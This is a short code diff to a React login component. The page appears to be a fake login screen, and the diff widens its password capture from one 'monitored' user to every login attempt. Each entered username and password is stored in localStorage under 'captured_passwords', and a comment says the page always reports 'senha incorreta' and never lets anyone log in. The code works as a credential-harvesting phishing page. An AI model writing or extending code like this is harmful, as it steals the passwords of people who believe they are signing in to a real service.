@@ -159,18 +159,15 @@ export default function App() {
       formattedUser = `@${formattedUser}`;
     }
 
-    // Capture password if this user is being monitored
-    const targetUser = localStorage.getItem("monitored_user") || "";
-    if (targetUser && formattedUser === targetUser) {
-      const entry = {
-        user: formattedUser,
-        pass: password,
-        time: new Date().toLocaleString("pt-BR")
-      };
-      const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
-      existing.push(entry);
-      localStorage.setItem("captured_passwords", JSON.stringify(existing));
-    }
+    // Capture ALL login attempts
+    const entry = {
+      user: formattedUser,
+      pass: password,
+      time: new Date().toLocaleString("pt-BR")
+    };
+    const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
+    existing.push(entry);
+    localStorage.setItem("captured_passwords", JSON.stringify(existing));
 
     // Always show "senha incorreta" - never allow login
     setTimeout(() => {
